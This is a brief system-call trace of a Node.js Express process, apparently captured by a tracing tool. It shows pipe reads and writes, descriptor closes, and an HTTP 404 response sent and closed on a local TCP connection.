+node 23642  close fd=25(<u>) 
+node 23642  close res=0 
+node 23642 pipe:[113486] read fd=14(<p>pipe:[113486]) size=512 
+node 23642 pipe:[113486] read res=16 data=....'V.......... 
+node 23642  close fd=21(<u>) 
+node 23642  close res=0 
+node 23642 pipe:[113484] read fd=4(<p>pipe:[113484]) size=1 
+node 23642 pipe:[113484] read res=1 data=* 
+node 23642 pipe:[113484] write fd=5(<p>pipe:[113484]) size=1 
+node 23642 pipe:[113484] write res=1 data=* 
+node 23642 192.168.1.99:34180->172.18.0.2:3000 writev fd=20(<4t>192.168.1.99:34180->172.18.0.2:3000) size=316 
+node 23642 192.168.1.99:34180->172.18.0.2:3000 writev res=316 data=HTTP/1.1 404 Not Found..X-Powered-By: Express..Content-Type: application/json; c 
+node 23642 192.168.1.99:34180->172.18.0.2:3000 read fd=20(<4t>192.168.1.99:34180->172.18.0.2:3000) size=65536 
+node 23642 192.168.1.99:34180->172.18.0.2:3000 read res=0 data=NULL 
+node 23642 192.168.1.99:34180->172.18.0.2:3000 shutdown fd=20(<4t>192.168.1.99:34180->172.18.0.2:3000) how=1(SHUT_WR) 
+node 23642 192.168.1.99:34180->172.18.0.2:3000 shutdown res=0 
+node 23642 192.168.1.99:34180->172.18.0.2:3000 close fd=20(<4t>192.168.1.99:34180->172.18.0.2:3000) 
+node 23642 192.168.1.99:34180->172.18.0.2:3000 close res=0 
